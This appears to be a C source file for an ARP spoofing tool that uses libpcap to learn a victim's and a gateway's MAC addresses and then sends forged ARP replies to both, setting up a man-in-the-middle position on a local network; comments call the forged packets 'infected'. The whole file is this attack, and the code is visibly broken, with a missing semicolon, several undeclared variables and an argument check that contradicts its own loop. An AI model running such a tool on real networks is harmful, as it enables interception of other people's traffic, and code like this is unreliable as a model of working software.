#include "arp_lib.h"
#include <pthread.h>




int main(int argc, char *argv[])
{
	pcap_t* handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	uint8_t my_MAC[6] = {0,};
	uint8_t senders_MAC[6] = {0,};
	uint8_t broadcast_MAC[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
	uint8_t target_MAC[6] = {0,};
	struct in_addr my_IP;

	
	
	if(argc != 4)
	{
		printf("Usage: ./arp_spoorf [interface] [sender_ip] [target_ip]");
		return 0;
	}
	spoof_num = ((argc - 2)/2)
	sender_list = (struct in_addr*)malloc(spoof_num * sizeof(in_addr));
	target_list = (struct in_addr*)malloc(spoof_num * sizeof(in_addr));
	for(i=0 ; i < (argc - 2)/2 ;i ++)
	{
		inet_aton(argv[2 * i + 2],&sender_list[i]);
		inet_aton(argv[2 * i + 3],&target_list[i]);
	} // input data

	
	handle = pcap_open_live(argv[1],BUFSIZ,1,1000,errbuf);
	get_addr(my_MAC, &my_IP, argv[1]);

	rs_ARP(handle, my_MAC, broadcast_MAC, &my_IP, &senders_ip,1); //broadcast_request

	get_senders_mac(handle, &senders_ip,senders_MAC);

	rs_ARP(handle, my_MAC, senders_MAC, &target_ip, &senders_ip,2); // send_infected_packet to victim
	
	// infec senders network
	
	rs_ARP(handle, my_MAC, broadcast_MAC, &my_IP, &senders_ip,1); 
	get_senders_mac(handle, &target_ip, target_MAC); // get target's mac address

	rs_ARP(handle, my_MAC, target_MAC, &senders_ip, &target_ip,2);
	spoofing(handle, target_MAC, senders_MAC, my_MAC);
	return 0;

}
